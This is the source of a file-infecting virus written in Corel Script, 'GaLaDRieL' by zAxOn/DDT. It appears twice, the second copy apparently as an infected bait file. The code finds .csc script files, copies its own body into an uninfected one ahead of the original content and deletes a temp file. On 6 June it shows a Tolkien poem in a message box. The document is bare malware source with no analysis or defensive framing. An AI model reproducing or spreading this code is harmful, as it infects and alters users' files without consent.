   REM ViRUS GaLaDRieL FOR COREL SCRIPT bY zAxOn/DDT
   fecha$=GetCurrDate ()
   If Left(fecha$,1)="6" Then If Mid(fecha$,3,2)="06" Then Goto Elessar
   Goto Palantir
   Elessar:
   Mensajito$= "
   Ai! lauri‰ lantar lassi s£rinen!.
   Y‚ni £n¢time ve r mar aldaron,
   y‚ni ve linte yuldar v nier
   mi oromardi lisse-miruv¢reva
   And£ne pella Vardo tellumar
   nu luini yassen tintilar i eleni
   ¢maryo airet ri-lirinen.
           ...."
   Titulo = "GaLaDRieL ViRUS bY zAxOn/DDT"
   Messagebox Mensajito$,Titulo,64
   Palantir:
   nombre$=FindFirstFolder ("*.csc",32 + 128)
   Do while not nombre$=""
   Open nombre$ For Input As #1
   Palacios_Intemporales:
   Line Input #1,linea$
   If linea$="" then goto Palacios_Intemporales
   if victima_bool=1 Then Goto Esgaroth
   If Instr(linea$,"REM ViRUS",1)=0 then
   victima$=nombre$
   victima_bool=1
   End if
   Esgaroth:
   If Instr(linea$,"REM ViRUS",1)<> 0 Then
   yo_estoy_en$=nombre$
   conocimiento=1
   End if
   Close
   If conocimiento=1 Then If victima_bool=1 Then Goto LothLorien
   nombre$=FindNextFolder ()
   If nombre$="" Then Goto Los_Puertos_Grises
   Loop
   LothLorien:
   Kill "mallorn.tmp"
   Rename victima$,"mallorn.tmp",0
   Open yo_estoy_en$ For Input As #1
   open victima$ For Output As #2
   Do While Not Left(linea$,7)="REM END"
   Line Input #1,linea$
   Print #2,linea$
   Loop
   Line Input #1,linea$
   Print #2,linea$
   Close
   Open victima$ For Append As #1
   Open "mallorn.tmp" For Input As #2
   Do While Not Eof(2)
   Line Input #2,linea$
   Print #1,linea$
   Loop
   Close
   Kill "mallorn.tmp"
   Los_Puertos_Grises:
   REM END OF ViRUS GaLaDRieL bY zAxOn/DDT
   rem bait file
   REM ViRUS GaLaDRieL FOR COREL SCRIPT bY zAxOn/DDT
   fecha$=GetCurrDate ()
   If Left(fecha$,1)="6" Then If Mid(fecha$,3,2)="06" Then Goto Elessar
   Goto Palantir
   Elessar:
   Mensajito$= "
   Ai! lauri‰ lantar lassi s£rinen!.
   Y‚ni £n¢time ve r mar aldaron,
   y‚ni ve linte yuldar v nier
   mi oromardi lisse-miruv¢reva
   And£ne pella Vardo tellumar
   nu luini yassen tintilar i eleni
   ¢maryo airet ri-lirinen.
           ...."
   Titulo = "GaLaDRieL ViRUS bY zAxOn/DDT"
   Messagebox Mensajito$,Titulo,64
   Palantir:
   nombre$=FindFirstFolder ("*.csc",32 or 128)
   Do while not nombre$=""
   Open nombre$ For Input As #1
   Palacios_Intemporales:
   Line Input #1,linea$
   If linea$="" then goto Palacios_Intemporales
   if victima_bool=1 Then Goto Esgaroth
   If Instr(linea$,"REM ViRUS",1)=0 then
   victima$=nombre$
   victima_bool=1
   End if
   Esgaroth:
   If Instr(linea$,"REM ViRUS",1)<> 0 Then
   yo_estoy_en$=nombre$
   conocimiento=1
   End if
   Close
   If conocimiento=1 Then If victima_bool=1 Then Goto LothLorien
   nombre$=FindNextFolder ()
   If nombre$="" Then Goto Los_Puertos_Grises
   Loop
   LothLorien:
   Kill "mallorn.tmp"
   Rename victima$,"mallorn.tmp",0
   Open yo_estoy_en$ For Input As #1
   open victima$ For Output As #2
   Do While Not Left(linea$,7)="REM END"
   Line Input #1,linea$
   Print #2,linea$
   Loop
   Line Input #1,linea$
   Print #2,linea$
   Close
   Open victima$ For Append As #1
   Open "mallorn.tmp" For Input As #2
   Do While Not Eof(2)
   Line Input #2,linea$
   Print #1,linea$
   Loop
   Close
   Kill "mallorn.tmp"
   Los_Puertos_Grises:
   REM END OF ViRUS GaLaDRieL bY zAxOn/DDT
